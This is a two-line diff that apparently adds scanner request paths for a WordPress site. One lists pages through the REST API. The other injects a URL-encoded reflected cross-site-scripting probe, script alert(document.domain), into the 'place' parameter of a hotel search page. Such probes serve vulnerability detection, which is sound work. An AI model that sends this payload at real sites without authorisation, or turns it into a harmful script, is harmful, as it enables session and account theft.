@@ -1,0 +1,2 @@
+/index.php?rest_route=/wp/v2/pages&per_page=100
+/?page_id={{search_page_id}}&type=tf_hotel&place=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&adults=2&children=1&room=1
